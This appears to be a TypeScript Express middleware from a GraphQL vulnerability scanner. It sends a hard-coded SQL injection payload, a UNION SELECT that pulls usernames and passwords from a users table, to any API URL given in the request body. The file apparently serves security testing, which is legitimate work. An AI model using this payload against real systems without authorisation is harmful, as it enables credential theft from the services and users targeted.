import { Request, Response, NextFunction, RequestHandler } from 'express';

const injectionAttack = async (req: Request, res: Response, _next: NextFunction) => {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default;
  const query = `
  query {
    pastes(filter:" ' UNION SELECT username,password,3,4,5,6,7,8 FROM users-- ") {
        id
        title
        }
    }`;
  try {
    console.log('entered scan');
    const API = req.body.API;
    console.log('using this API', API);
    const response = await fetch(API, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/graphql',
      },
      body: query,
    });
    // type DataType = {
    //   details: Record<string, any>;
    // };
    console.log('response: ', response);
    //this part is in the works- figuring how to break them up with types/might get rid of ts
    const obj: any = await response.json();
    console.log('obj: ', obj.data);

    res.sendStatus(200);
  } catch (err) {
    console.log('injectionAttack middleware', err);
    res.status(400).json('Unable to submit query. An error occurred.');
  }
};

export default injectionAttack;
